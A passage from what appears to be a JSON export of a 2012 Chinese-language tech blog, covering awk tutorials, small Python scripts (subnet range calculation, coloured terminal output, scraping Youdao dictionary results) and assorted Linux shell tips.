',' '/dongwm/ {print $2, $3}' test.txt  寻找匹配行\ndongwm dongwm.com\ndongwm@linux-dongwm:~&gt; awk -F ',' '/^112/ {print \"Test id 112 is\", $2}' test.txt</p>\n\n<p>Test id 112 is dongwm  #选找开头是112的，然后自定义一些打印字符</p>\n\n<p><strong>6 内建变量</strong>\n1 FS :输入字段分隔符，模认的是空格\n看下面的例子：</p>\n\n<p>dongwm@linux-dongwm:~&gt; awk -F ',' '{print $2, $3}' test.txt\ndongwm dongwm.com\nailll ailll.com\nccc ccc.com\ndongwm@linux-dongwm:~&gt; awk 'BEGIN {FS=\",\"} {print $2, $3}' test.txt\ndongwm dongwm.com\nailll ailll.com\nccc ccc.com\n注：这2个是一样的效果</p>\n\n<p>dongwm@linux-dongwm:~&gt; cat test.txt\n112,dongwm,dongwm.com%1120\n113,ailll,ailll.com%1130\n114,ccc,ccc.com%1140\ndongwm@linux-dongwm:~&gt; awk 'BEGIN {FS=\"[,:%]\"} {print $2, $3}' test.txt  #在这里会匹配‘,’,‘:’,'%'这三个分割符，三者是或者的关系\ndongwm dongwm.com\nailll ailll.com\nccc ccc.com\n2 OFS 输出字段分隔符，模认的是空格\ndongwm@linux-dongwm:~&gt; awk -F ',' '{print $2, \":\", $3}' test.txt\ndongwm : dongwm.com\nailll : ailll.com\nccc : ccc.com\n其实这个例子可以用下面的语句实现\ndongwm@linux-dongwm:~&gt; awk -F ',' 'BEGIN { OFS=\":\" } { print $2, $3 }' test.txt\ndongwm:dongwm.com\nailll:ailll.com\nccc:ccc.com\n3 RS 记录分隔符\ndongwm@linux-dongwm:~&gt; cat test.txt\n112,dongwm:113,ailll:114,ccc\ndongwm@linux-dongwm:~&gt; awk -F, '{print $2}' test.txt\ndongwm:113  #因为在一行里面，没有实现取出所有符合要求的值\ndongwm@linux-dongwm:~&gt; awk -F, 'BEGIN { RS=\":\" } {print $2}' test.txt  #s使用RS可以实现\ndongwm\nailll\nccc\n一个复杂的例子：</p>\n\n<p>dongwm@linux-dongwm:~&gt; cat test.txt\n112\ndongwm\ndongwm.com\n-\n113\nailll\nailll.com\n-\n114\nccc\nccc.com\ndongwm@linux-dongwm:~&gt; awk 'BEGIN { FS=\"\\n\"; RS=\"-\\n\"; OFS=\":\" } {print $2, $3}' test.txt\ndongwm:dongwm.com\nailll:ailll.com\nccc:ccc.com\n4 ORS 输出记录分割符</p>\n\n<p>dongwm@linux-dongwm:~&gt; awk 'BEGIN { FS=\",\"; ORS=\"\\n---\\n\" } {print $2, $3}' test.txt #在输出的时候，每行都添加了一段‘\\n---\\n’\ndongwm dongwm.com\n---\nailll ailll.com\n---\nccc ccc.com\n---\n5 NR 对数量的记录\ndongwm@linux-dongwm:~&gt; awk 'BEGIN {FS=\",\"} \\\n{print \"Test Id of record number\",NR,\"is\",$1;} \\\nEND {print \"Total number of records:\",NR}' test.txt\nTest Id of record number 1 is 112\nTest Id of record number 2 is 113\nTest Id of record number 3 is 114\nTotal number of records: 3\n6 FILENAME  当前的文件名</p>\n\n<p>dongwm@linux-dongwm:~&gt; awk '{ print FILENAME }' test.txt\ntest.txt\ntest.txt\ntest.txt  #因为有三行数据，每行打印了一次</p>\n\n<p>7 FNR 记录的数量的文件  NR会保存数据在多文件中一直增长，但FNR不会，他只是记录当前文件的数量记录</p>\n\n<p>dongwm@linux-dongwm:~&gt; awk 'BEGIN {FS=\",\"} \\\n{print FILENAME \": record number\",NR,\"is\",$1;} \\\nEND {print \"Total number of records:\",NR}' test.txt test.txt.bak\ntest.txt: record number 1 is 112\ntest.txt: record number 2 is 113\ntest.txt: record number 3 is 114\ntest.txt.bak: record number 4 is 112\ntest.txt.bak: record number 5 is 113\ntest.txt.bak: record number 6 is 114\nTotal number of records: 6\ndongwm@linux-dongwm:~&gt; awk 'BEGIN {FS=\",\"} \\\n{print FILENAME \": record number\",FNR,\"is\",$1;} \\\nEND {print \"Total number of records:\",NR}' test.txt test.txt.bak\ntest.txt: record number 1 is 112\ntest.txt: record number 2 is 113\ntest.txt: record number 3 is 114\ntest.txt.bak: record number 1 is 112\ntest.txt.bak: record number 2 is 113\ntest.txt.bak: record number 3 is 114\nTotal number of records: 6</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "April",
      "day": "18"
    }
  },
  {
    "id": 146,
    "title": "关于awk研究（四）",
    "category": "awk",
    "tags": [
      "awk"
    ],
    "url": "/archives/guanyuawkyanjiusi/",
    "content": "<p><strong>1 printf</strong></p>\n\n<p>\"print format\", variable1, variable2, etc.\ndongwm@linux-dongwm:~&gt; awk 'BEGIN { printf \"Field 1\\t\\tField 2\\tField 3\\tField 4\\n\" }'\nField 1        Field 2    Field 3    Field 4  #格式化输出\ndongwm@linux-dongwm:~&gt; awk 'BEGIN { printf \"Field 1\\vField 2\\vField 3\\vField 4\\n\" }'\nField 1\nField 2\nField 3\nField 4\ndongwm@linux-dongwm:~&gt; awk 'BEGIN \\\n&gt; { printf \"Field 1\\bField 2\\bField 3\\bField 4\\n\" }'   #\\b退格\nField Field Field Field 4</p>\n\n<p>下面2个例子：</p>\n\n<p>dongwm@linux-dongwm:~&gt; awk 'BEGIN {FS=\",\";OFS=\":\";ORS=\"\\n--\\n\";} {print $2,$3}' test.txt\ndongwm:dongwm.com\n--\nailll:ailll.com\n--\nccc:ccc.com\n--\ndongwm@linux-dongwm:~&gt; awk 'BEGIN {FS=\",\";OFS=\":\";ORS=\"\\n--\\n\";} {printf \"%s:%s\\n\\n\",$2,$3}' test.txt #这里就是格式化输出，%s就是字符串 ，前台2个%s,就是后面的$2 $3\ndongwm:dongwm.com</p>\n\n<p>ailll:ailll.com</p>\n\n<p>ccc:ccc.com</p>\n\n<p>dongwm@linux-dongwm:~&gt; awk 'BEGIN {FS=\",\";OFS=\":\";ORS=\"\\n--\\n\";} {printf \"%10s:%3s:%10s:%-7s\\n\\n\",$1,$2,$3,$4}' test.txt\n112:dongwm:dongwm.com:1120   #固定列宽，正数是右对其，负数左对齐</p>\n\n<p>113:ailll: ailll.com:1130</p>\n\n<p>114:ccc:   ccc.com:1140\ndongwm@linux-dongwm:~&gt; awk 'BEGIN { printf \"%6s\\n\", \"Good Boy!\" }'\nGood Boy!\ndongwm@linux-dongwm:~&gt; awk 'BEGIN { printf \"%.6s\\n\", \"Good Boy!\" }'  #这个‘.’说明这里只保留6个字符\nGood B\ndongwm@linux-dongwm:~&gt; awk 'BEGIN { printf \"%6s\\n\", substr(\"Good Boy!\",1,6) }'  #效果是一样的\nGood B\n<strong>2 内置数值函数</strong>\n1 int</p>\n\n<p>dongwm@linux-dongwm:~&gt; awk 'BEGIN{print int(3.534);print int(4);print int(-5.223);print int(-5);}'\n3\n4\n-5\n-5\n<strong>2 log  #对数，不记得了可以翻翻高中数学课本^.^</strong></p>\n\n<p>dongwm@linux-dongwm:~&gt; awk 'BEGIN{print log(13);print log(0);print log(1);print log(-5);}' #\n2.56495\n-inf\n0\nawk: 警告: log: 收到负数参数 -5\nnan\n<strong>3 sqrt #平方根</strong>\ndongwm@linux-dongwm:~&gt; awk 'BEGIN{print sqrt(64);print sqrt(0);print sqrt(-5);}'\n8\n0\nawk: 警告: sqrt: 收到负数参数 -5\n-nan\n<strong>4 exp ＃e的N次方</strong></p>\n\n<p>dongwm@linux-dongwm:~&gt; awk 'BEGIN{print exp(123456789);print exp(0);print exp(-12);}'\nawk: 警告: exp: 参数 1.23457e+08 超出范围\ninf\n1\n6.14421e-06\n<strong>3 随机数</strong></p>\n\n<p>1 rand #0-1之间的随机数</p>\n\n<p>cat test.awk\nBEGIN {\nwhile(i&lt;1000)\n{\nn = int(rand()*100);\nrnd[n]++;\ni++;\n}\nfor(i=0;i&lt;=5;i++) {\nprint i,\"Occured\", rnd[i], \"times\";\n}\n}</p>\n\n<p>dongwm@linux-dongwm:~&gt; awk -f test.awk\n0 Occured 11 times\n1 Occured 8 times\n2 Occured 9 times\n3 Occured 15 times\n4 Occured 16 times\n5 Occured 5 times\n2  srand #初始化随机数的开始\ndongwm@linux-dongwm:~&gt; cat test.awk\nBEGIN {\nsrand(5);\ntotal=5;\nmax=50;\ncount=0;  #随机数从5－50\nwhile(count &lt; total) {\nrnd = int(rand() * max);\nif ( array[rnd] == 0 ) {\ncount++;\narray[rnd]++;\n}\n}\nfor ( i=5; i&lt;=max; i++) {\nif ( array[i] )\nprint i;\n}\n}</p>\n\n<p>dongwm@linux-dongwm:~&gt; awk -f test.awk\n14\n16\n23\n33\n35\n<strong>4 字符串函数</strong>\n<strong>1 index #字符串索引</strong></p>\n\n<p>dongwm@linux-dongwm:~&gt; awk 'BEGIN {dongwm=\"dongwm.com\";print \"string start at\",index(dongwm,\"wm\");}'  #找到‘wm’的索引\nstring start at 5</p>\n\n<p><strong>2 length</strong> #字符串长度\ndongwm@linux-dongwm:~&gt; awk '{print length($0)}' test.txt\n26\n24\n20\n<strong>3 split  #分隔</strong></p>\n\n<p>语法：split(input-string,output-array,separator)\ndongwm@linux-dongwm:~&gt; awk '{split($0,qu,\",\");for (x in qu) print qu[x];}' test.txt\n1120\n112\ndongwm\ndongwm.com\n1130\n113\nailll\nailll.com\n1140\n114\nccc\nccc.com\n<strong>4 Substr</strong>\n语法：substr(input-string, location, length)\ndongwm@linux-dongwm:~&gt; awk 'BEGIN{FS=\",\"} {print substr($1,3)}' test.txt #\n2\n3\n4\ndongwm@linux-dongwm:~&gt; awk 'BEGIN{FS=\",\"} {print substr($1,1,3)}' test.txt  #第一个字段，从第一个字符开始打印3个字符\n112\n113\n114\n<strong>5 nawk和gwak特有字符串函数：</strong></p>\n\n<p>语法：sub(original-string,replacement-string,string-variable)\ndongwm@linux-dongwm:~&gt; awk 'BEGIN{dongwm=\"dongwmDongmcom\";sub(\"[Dd]o\",\"CC\",dongwm);print dongwm;}'  test.txt #用‘CC’替换‘Do‘或者’do‘\nCCngwmDongmcom  #只题换了第一个</p>\n\n<p>语法：gsub(original-string,replacement-string,string-variable)</p>\n\n<p>dongwm@linux-dongwm:~&gt; awk 'BEGIN{dongwm=\"dongwmDongmcom\";gsub(\"[Dd]o\",\"CC\",dongwm);print dongwm;}'  test.txt\nCCngwmCCngmcom  #替换了所有符合的\n语法：match(input-string,search-string)\ndongwm@linux-dongwm:~&gt; awk 'BEGIN{dongwm=\"dongwmDongmcom\";if(match(dongwm,\"dongwm\"));{print \"match!\"}}'  test.txt\nmatch! #搜索发现匹配\ndongwm@linux-dongwm:~&gt; awk 'BEGIN{dongwm=\"dongwmDongmcom\";print tolower(dongwm)}' #转化成小写\ndongwmdongmcom\ndongwm@linux-dongwm:~&gt; awk 'BEGIN{dongwm=\"dongwmDongmcom\";print toupper(dongwm)}' #转化成大写\nDONGWMDONGMCOM</p>\n",
    "date": {
      "year": "2012",
      "month": "April",
      "day": "20"
    }
  },
  {
    "id": 147,
    "title": "关于AWK研究（五）",
    "category": "awk",
    "tags": [

    ],
    "url": "/archives/guanyuawkyanjiuwu/",
    "content": "<p><strong>1 IGNORECASE忽略大小写</strong></p>\n\n<p>dongwm@linux-dongwm:~&gt; awk '/aaa/{print}' test.txt   #默认IGNORECASE是0\ndongwm@linux-dongwm:~&gt; awk 'BEGIN{IGNORECASE=1}/aaa/{print}' test.txt\n115,AAA\n<strong>2 ERRNO  错误输出</strong>\ndongwm@linux-dongwm:~&gt; cat test.awk\n{\nprint $0;\nx = getline &lt; \"dummy-file.txt\"\nif ( x == -1 )\nprint ERRNO   #当出现一个I／O错误，会把ERRNO变成输出信息\nelse\nprint $0;\n}</p>\n\n<p>dongwm@linux-dongwm:~&gt; awk -f test.awk test.txt\n112,dongwm,dongwm.com,1120\n没有那个文件或目录\n113,ailll,ailll.com,1130\n没有那个文件或目录\n114,ccc,ccc.com,1140\n没有那个文件或目录\n<strong>3 用户自定义方法</strong></p>\n\n<p>语法：</p>\n\n<p>function fn-name(parameters)\n{\nfunction-body\n}\ndongwm@linux-dongwm:~&gt; cat test.awk\n{\ni=1; total=0;\nwhile (i &lt;= NF) {\nmydebug(\"quantity is \" $i);\ntotal = total + $i;\ni++;\n}\nprint \"Item\", $1, \":\",\"num is\",total;\n}\nfunction mydebug ( message ) {\nprintf(\"DEBUG[%d]&gt;%s\\n\", NR, message )\n}</p>\n\n<p>dongwm@linux-dongwm:~&gt; awk -f test.awk test.txt\nDEBUG[1]&gt;quantity is 112,dongwm,dongwm.com,1120\nItem 112,dongwm,dongwm.com,1120 : num is 112\nDEBUG[2]&gt;quantity is 113,ailll,ailll.com,1130\nItem 113,ailll,ailll.com,1130 : num is 113\nDEBUG[3]&gt;quantity is 114,ccc,ccc.com,1140\nItem 114,ccc,ccc.com,1140 : num is 114</p>\n\n<p><strong>4 其他语言输出</strong></p>\n\n<p>dongwm@linux-dongwm:~&gt; cat test.awk   # 第一步 建立文件域\nBEGIN {\nFS=\",\"\nTEXTDOMAIN = \"test\"   #这个很重要 最后的.mo文件要一样\nbindtextdomain(\".\")\nprint _\"START_TIME:\" strftime(\"%a %b %d %H:%M:%S %Z%Y\",systime());\nprintf \"%-3s\\t\", _\"Num\";   #‘_’表示定制，打印时候是不显示的\nprintf \"%-10s\\t\", _\"Description\"\nprintf \"%-10s\\t\", _\"Domain\"\nprintf \"%-5s\\t\", _\"Price\"\nprintf\"-----------------------------------------------------\\n\"\n}\n{\nprintf \"%-3d\\t%-10s\\t%-10s\\t$%-.2f\\n\",\n$1,$2,$3,$4\n}</p>\n\n<p>dongwm@linux-dongwm:~&gt; awk -f test.awk test.txt  #格式化输出为下面\nSTART_TIME:一  4月 23 10:19:29 CST2012\nNum    Description    Domain        Price    -----------------------------------------------------\n112    dongwm        dongwm.com    $1120.00\n113    ailll         ailll.com     $1130.00\n114    ccc           ccc.com       $1140.00\ndongwm@linux-dongwm:~&gt; gawk --gen-po -f test.awk &gt; test.po  #第二步  创建.po文件(portable object file  便携式对象文件)\ndongwm@linux-dongwm:~&gt; cat !$\ncat test.po\n#: test.awk:5\nmsgid \"START_TIME:\"\nmsgstr \"\"</p>\n\n<p>#: test.awk:6\nmsgid \"Num\"\nmsgstr \"\"</p>\n\n<p>#: test.awk:7\nmsgid \"Description\"\nmsgstr \"\"</p>\n\n<p>#: test.awk:8\nmsgid \"Domain\"\nmsgstr \"\"</p>\n\n<p>#: test.awk:9\nmsgid \"Price\"\nmsgstr \"\"\n第三步 修改.po文件，比如有一行：msgid \"START_TIME:\"，假如想显示成“Report Generated On:” 可以这样：</p>\n\n<p>#: test.awk:5\nmsgid \"START_TIME:\"\nmsgstr \"Report Generated On:\"\ndongwm@linux-dongwm:~&gt; msgfmt -v test.po  #第四步 建立消息对象\n1 条已翻译消息，4 条未翻译消息.\ndongwm@linux-dongwm:~&gt; ll messages.mo   #生成了这个文件\n-rw-r--r-- 1 dongwm users 89  4月 23 10:25 messages.mo\ndongwm@linux-dongwm:~&gt; mkdir -p en_US/LC_MESSAGES   #拷贝这个文件到你想要的语言目录\ndongwm@linux-dongwm:~&gt; mv messages.mo en_US/LC_MESSAGES/test.mo\n<strong>5 双向通讯</strong></p>\n\n<p>dongwm@linux-dongwm:~&gt; cat test.awk\nBEGIN {\ncommand = \"sed 's/Awk/Sed and Awk/'\"\nprint \"Awk is Great!\" |&amp; command                #“|&amp;”表明它是一个双向的沟通。\nclose(command,\"to\");\ncommand |&amp; getline tmp  #进程完成，按行输出显示\nprint tmp;\nclose(command);\n}\ndongwm@linux-dongwm:~&gt; awk -f test.awk\nSed and Awk is Great!\n<strong>6使用系统命令方法</strong></p>\n\n<p>dongwm@linux-dongwm:~&gt; awk 'BEGIN { system(\"pwd\") }'\n/home/dongwm\ndongwm@linux-dongwm:~&gt; awk 'BEGIN { system(\"date\") }'\n2012年 04月 23日 星期一 10:49:10 CST\n<strong>7 时间戳方法</strong></p>\n\n<p>dongwm@linux-dongwm:~&gt; awk 'BEGIN { print systime() }'\n1335149444\ndongwm@linux-dongwm:~&gt; awk 'BEGIN { print strftime(\"%c\",systime()) }'\n2012年04月23日 星期一 10时50分53秒<strong></strong></p>\n",
    "date": {
      "year": "2012",
      "month": "April",
      "day": "23"
    }
  },
  {
    "id": 148,
    "title": "python找到ip段可用ip最大和最少ip",
    "category": "python",
    "tags": [
      "python ip段"
    ],
    "url": "/archives/pythonzhaodaoipduankeyongipzuidahezuishaoip/",
    "content": "<p>前言：一个小需求，当用户输入‘XXX.XXX.XXX.XXX/XX’（ip/netmask）时候自动帮他分析出这个网段除去网络号和广播地址外的开始和结束ip</p>\n\n<p><pre class=\"sh_python\">\ndef ipto(iplist):\n    data = iplist.split('/')\n    ip= data[0]\n    ti = int(data[1])\n    d = int(ti/8)\n    c = 256/(2**(ti%8))\n    ip_items = ip.split('.')\n    if len(ip_items[d:]) == 1:\n        if ti%8 == 0:\n            cmin = '%s.%s' % ('.'.join(ip_items[:d]),'0')\n            cmax = '%s.%s' % ('.'.join(ip_items[:d]),'255')\n        else:\n            for i in range(2**(ti%8)):\n\t        mymax = (i+1)*c-1\n\t        mymin=  i*c\n\t        data =  int(''.join(ip_items[d:]))\n\t        if data &lt; mymax and data &gt;= mymin:\n\t            cmin = '%s.%s' % ('.'.join(ip_items[:d]),mymin)\n  \t            cmax = '%s.%s' % ('.'.join(ip_items[:d]),mymax)\n    else:\n        if ti%8 == 0:\n             cmin = '%s.%s.%s' % ('.'.join(ip_items[:d]),'0',('0.'*(len(ip_items)-d-1))[:-1])\n             cmax = '%s.%s.%s' % ('.'.join(ip_items[:d]),'255',('255.'*(len(ip_items)-d-1))[:-1])\n        else:\n\t    for i in range(2**(ti%8)):\n                mymax = (i+1)*c-1\n                mymin=  i*c\n\t        data =  int(''.join(ip_items[d]))\n\t        if data &lt; mymax and data &gt;= mymin:\n\t\t    cmin = '%s.%s.%s' % ('.'.join(ip_items[:d]),mymin,('0.'*(len(ip_items)-d-1))[:-1])\n\t\t    cmax = '%s.%s.%s' % ('.'.join(ip_items[:d]),mymax,('255.'*(len(ip_items)-d-1))[:-1])\n    print  cmin,cmax\n</pre></p>\n",
    "date": {
      "year": "2012",
      "month": "April",
      "day": "27"
    }
  },
  {
    "id": 149,
    "title": "python终端显示彩色字符",
    "category": "linux基础",
    "tags": [
      "echo -e",
      "python终端显示彩色",
      "彩色终端"
    ],
    "url": "/archives/pythonzhongduanxianshicaisezifu/",
    "content": "<p>前言：作一个脚本或者程序在需要发音很多输出的时候，默认的白色会让人看的很困，但是有了彩色做个分割线或者让一些重要信息用彩色字体打印出来就好多了，以前一直在用模块实现，后来发现print借用ANSI控制码原来也可以：参见：http://www.oschina.net/code/snippet_87675_8599</p>\n\n<p>1分析这个程序</p>\n\n<p><pre class=\"sh_python\">\n#!/usr/bin/env python\n#-*-coding:utf-8-*-\n#Filename:</p>\n\n<p>__author__ = \"maqiang.jacky &lt;maqiang.jacky@snda.com&gt;\"\n__version__ = 1.0\n__date__ = \"12-2-9\"</p>\n\n<p>\"\"\"\n0  All attributes off 默认值\n1  Bold (or Bright) 粗体 or 高亮\n4  Underline 下划线\n5  Blink 闪烁\n7  Invert 反显\n30 Black text\n31 Red text\n32 Green text\n33 Yellow text\n34 Blue text\n35 Purple text\n36 Cyan text\n37 White text\n40 Black background\n41 Red background\n42 Green background\n43 Yellow background\n44 Blue background\n45 Purple background\n46 Cyan background\n47 White background\n\"\"\"\ndef main():\n    \"\"\" \"\"\"\nfor atrr in [0,1,4,5,7]:   0表示无属性，1表示高亮，4加下划线，5表示闪烁 ，7反显 ，8消隐 \n    print \"attribute %d ------------------------------\" % atrr\n    for fore in [30,31,32,33,34,35,36,37]:\n        for back in [40,41,42,43,44,45,46,47]:\n            color = \"\\x1B[%d;%d;%dm\" % (atrr,fore,back)  #除了atrr，分别代表 字的颜色，底色\n            print \"%s %d-%d-%d\\x1B[0m\" % (color,atrr,fore,back),\n        print \"\"\nif __name__ == \"__main__\":\n    \"\"\" \"\"\"\n    main()\n</pre></p>\n\n<p>其中</p>\n\n<p>字背景颜色范围:40----49\n40:黑\n41:深红\n42:绿\n43:黄色\n44:蓝色\n45:紫色\n46:深绿\n47:白色</p>\n\n<p>字颜色:30-----------39\n30:黑\n31:红\n32:绿\n33:黄\n34:蓝色\n35:紫色\n36:深绿\n37:白色</p>\n\n<p>因为我不需要底色，自己写了一个方法：</p>\n\n<p><pre class=\"sh_python\">\ndef myprint(color,mes):\n    if color == 'r':\n        fore = 31\n    elif color == 'g':\n        fore = 32\n    elif color == 'b':\n        fore = 36\n    elif color == 'y':\n        fore = 33\n    else:\n        fore = 37\n    color = \"\\x1B[%d;%dm\" % (1,fore)\n    print \"%s %s\\x1B[0m\" % (color,mes)\n</pre></p>\n\n<p>假如想显示一段信息为红色：</p>\n\n<p>dongwm@linux-dongwm:~&gt; myprint('r','some messages')</p>\n",
    "date": {
      "year": "2012",
      "month": "April",
      "day": "27"
    }
  },
  {
    "id": 150,
    "title": "linux技巧",
    "category": "linux一行代码技巧",
    "tags": [

    ],
    "url": "/archives/linuxjiqiao/",
    "content": "<p><strong>1 cat ~/.ssh/id_rsa.pub | ssh －p port user@server \"cat - &gt;&gt; ~/.ssh/authorized_keys\"  #ssh-copy-id类似</strong></p>\n\n<p><strong>2 awk 'BEGIN{srand()}{a[NR,rand()]=$0}END{y=0;for(i in a){print a[i];y++;if(y==num){exit;}}}'  file #从file中随机出num行显示出来</strong></p>\n\n<p><strong>3 sorted(dict.iteritems(), key=lambda d:d[1],reverse =True) #将字典dict以value按从大到小的顺序排序（python）</strong></p>\n\n<p><strong>4 history | awk '{a[$2]++}END{for(i in a){print a[i] \" \" i}}' | sort -rn | head #最常用的10条命令</strong></p>\n\n<p><strong>5 heapq.nlargest(10, d.iteritems(), operator.itemgetter(1)) #字典排序，返回根据value从大到小前十</strong></p>\n\n",
    "date": {
      "year": "2012",
      "month": "May",
      "day": "10"
    }
  },
  {
    "id": 151,
    "title": "使用BeautifulSoup抓取有道词典查询字典结果",
    "category": "python",
    "tags": [
      "BeautifulSoup",
      "爬虫",
      "网页代理"
    ],
    "url": "/archives/shiyongbeautifulsoupzhuaquyoudaocidianchaxunzidianjieguo/",
    "content": "<p>前言：BeautifulSoup是python第三方类库，用于解析和修改html和xml文件。有时候不会一个英语单词想查询还要登录网站输入单词然后搜索，不如写个抓取程序玩玩</p>\n\n<p>首先将一下运行过程：</p>\n\n<p>1 登录网站http://dict.youdao.com 2 在 form区域输入要输入的英语词 3 点击‘搜索’ 4 页面返回结果 5解析html文件 6 找到相关翻译项 7 打印出来</p>\n\n<p>1  分析form（我只截取了一部分）：</p>\n\n<p><pre class=\"sh_html4strict\">\n&lt;form method=\"<a>get</a>\" action=\"<a href=\"view-source:http://dict.youdao.com/search\">/search</a>\" class=\"<a>c-fm-w</a>\" id=\"<a>f</a>\"&gt;    #使用‘get’方法，地址是http://dict.youdao.com/search（程序会用到）\n    &lt;!--Begin 搜索框 --&gt;\n    &lt;span class=\"<a>s-inpt-w</a>\"&gt;\n        &lt;input type=\"<a>text</a>\" class=\"<a>s-inpt</a>\" autocomplete=\"<a>off</a>\" name=\"<a>q</a>\" id=\"<a>query</a>\" onmouseover=\"<a>this.focus()</a>\" onfocus=\"<a>this.select()</a>\" maxlength=\"<a>256</a>\"/&gt; #'name'是'q'，程序会用\n        &lt;span id=\"<a>hnwBtn</a>\" class=\"<a>hand-write</a>\"&gt;&lt;/span&gt;\n        &lt;!-- Begin 这两个SPAN 尽量写一行 --&gt;\n    &lt;/span&gt;&lt;span class=\"<a>s-btn-w</a>\"&gt;\n        &lt;!-- #End 这两个SPAN 尽量写一行 --&gt;\n        &lt;input type=\"<a>submit</a>\" class=\"<a>s-btn</a>\" id=\"<a>qb</a>\" value=\"<a>搜 索</a>\"/&gt;\n        &lt;input type=\"<a>hidden</a>\" name=\"<a>keyfrom</a>\" value=\"<a>dict.index</a>\"/&gt; &lt;/span&gt;\n&lt;/form &gt;\n</pre></p>\n\n<p>当提交后，看我的firebug的分析图：<!--more--></p>\n\n<p><img class=\"alignnone\" title=\" \" src=\"http://pic.yupoo.com/dongweiming/C0ZeWohB/medium.jpg\" alt=\"\" width=\"500\" height=\"390\" /></p>\n\n<p>如图用红线划取部分：</p>\n\n<p>查询结果在'class':'trans-container'的这个‘div’下面，然后解析之，看我的程序</p>\n\n<p><pre class=\"sh_python\">\n#coding=utf-8\nimport urllib\nimport urllib2\nimport string\nimport sys\nfrom BeautifulSoup import BeautifulSoup\nuser_agent = 'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0'  #自己描述的一个用户代理\nheaders = { 'User-Agent' : user_agent }\nvalues = {'q' : sys.argv[1] }   #这个'q'就是get方法的那个input的‘name’，上面已经指出\ndata = urllib.urlencode(values)\nrequest = urllib2.Request(\"http://dict.youdao.com/search\", data, headers)  #这是搜索的ation的页面，上面已经指出\nresponse = urllib2.urlopen(request)\nthe_page = response.read()\npool = BeautifulSoup(the_page)\nresults = pool.find('div', attrs={'class':'trans-wrapper clearfix','id':'phrsListTab'}) #看图，因为直接寻找'class':'trans-container'\n                                                     #内容太多，多层过滤了一下\nresults = results.find('div', attrs={'class':'trans-container'}).find('ul').findAll('li') #根据网站设计的标签 找到所有符合项\ntranslations = []\nfor result in results:\n    data=result.getText().split('.')\n    data[0]=data[0]+'.'\n    translations.append((data[0],data[1]))\nprint u'查询词－&gt;'+sys.argv[1]+u'的结果:'\nfor translation in translations:\n    print \"%s =&gt; %s\" % (translation[0], translation[1])\n</pre></p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "01"
    }
  },
  {
    "id": 152,
    "title": "最近的linux和shell使用总结",
    "category": "linux基础",
    "tags": [
      "dialog",
      "ffmpeg",
      "redis",
      "shell 发送邮件",
      "sqlite",
      "zenity"
    ],
    "url": "/archives/zuijindelinuxheshellshiyongzongjie/",
    "content": "<p>前言：很久没有写关于linux和shell的东西了，但是最近研究一些东西，把还有印象的一起拿出来</p>\n\n<p><strong>1 定义函数解压缩不同文件</strong></p>\n\n<p>注：需求产生其实是因为工作中会下载解压缩各种文件，比如.tar.gz ,tar.bz2,.gz,.zip等等后缀，不如自定义一个命令解压：</p>\n\n<p>ec () {\nif [ -f $1 ] ; then\ncase $1 in\n*.tar.bz2)   tar xjf $1        ;;\n*.tar.gz)    tar xzf $1     ;;\n*.bz2)       bunzip2 $1       ;;\n*.rar)       rar x $1     ;;\n*.gz)        gunzip $1     ;;\n*.tar)       tar xf $1        ;;\n*.tbz2)      tar xjf $1      ;;\n*.tgz)       tar xzf $1       ;;\n*.zip)       unzip $1     ;;\n*.Z)         uncompress $1  ;;\n*.7z)        7z x $1    ;;\n*)           echo \"'$1' cannot be extracted via extract()\" ;;\nesac\nelse\necho \"'$1' is not a valid file\"\nfi\n}\nexport ec\n你可以将以上内容放在~/.bashrc 中，这样启动shell就可以使用这个ec命令</p>\n\n<p><strong>2 shell的图形程序</strong></p>\n\n<p>注：可能大家一说图形程序那么就是qt，gtk，wxpython这样的语言实现的，但是对于一般的系统管理员或者简单的工作，没有必要</p>\n\n<p>1 Zenity</p>\n\n<p>它依赖X Window环境 与 GNOME 相捆绑。如果使用kde，需要单独安装（gtk依赖是很折磨人的）</p>\n\n<p><pre class=\"sh_bash\">\n#!/bin/bash\n(\n  echo \"10\" ;  sleep 1 #do something，我这里换成了sleep,以下同样，前面的10表示进度百分比，这个是自定义的数字而已，我根据大概时间占比设计的\n  echo \"# Start thunderbird\" ; sleep 1\n  echo \"30\" ; sleep 1\n  echo \"# Receive mail\" ; sleep 1\n  echo \"75\" ; sleep 1\n  echo \"# handle mail\" ; sleep 1\n  echo \"100\" ; sleep 1\n) |\nzenity --progress \\\n  --title=\"Update System Logs\" \\\n  --text=\"Scanning mail ...\" \\  #这个文件显示就是上面的那个10%过程里\n  --percentage=0</p>\n\n<p>if [ \"$?\" = -1 ] ; then\n  zenity --error \\\n    --text=\"Operate canceled.\"\nfi\n</pre></p>\n\n<p><pre class=\"sh_bash\">\nENTRY=`zenity --entry --text \"Please enter your name\" \\\n   --entry-text \"Your name\" --title \"Enter your name\"`\nif [ $? == 0 ]; then\n  zenity --info --text \"Hello $ENTRY\\!\"\nfi\n</pre></p>\n\n<p>2 dialog</p>\n\n<p>注：这个dialog在我以前的工作中还是比较经常使用的，一些脚本给用户一个选择的界面</p>\n\n<p><pre class=\"sh_bash\">\nRESULT=`dialog --stdout  \\\n   --checklist \"Enable the account options you want:\" 10 40 3 \\   #这里是是一个可以多选的框\n  1 \"Home directory\" on \\\n  2 \"Signature file\" off \\\n  3 \"Simple password\" off`\nif [ $? == 0 ]; then\n  zenity --info --text \"$RESULT\\!\"\nfi\n</pre></p>\n\n<p>例子很丰富，下载安装dialog的目录下有sample子文件夹，里面都是一些实现各种功能的shell脚本，大家可以去实践</p>\n\n<p><strong>3 抓取LINUX桌面的视频</strong></p>\n\n<p>注：以前很羡慕youtube的一些高清的关于linux桌面的视频，用录像工具发现很卡，后来发现了这个</p>\n\n<p>需要安装ffmpeg(opensuse11.4)</p>\n\n<p>sudo zypper addrepo -f http://ftp.gwdg.de/pub/linux/packman/suse/11.4/ packman</p>\n\n<p>sudo zypper addrepo -f http://opensuse-guide.org/repo/11.4/ dvd\nsudo zypper install ffmpeg\nffmpeg -f x11grab -s wxga -r 25 -i :0.0 -sameq /tmp/out.mpg\n注：</p>\n\n<p>-f x11grab 指定输入类型。因为x11的缓冲区不是普通的视频文件可以侦测格式，必须指定后ffmpeg才知道如何获得输入。</p>\n\n<p>-s wxga 设置抓取区域的大小。wxga是1366*768的标准说法，也可以换成-s 800×600的写法。</p>\n\n<p>-r 25 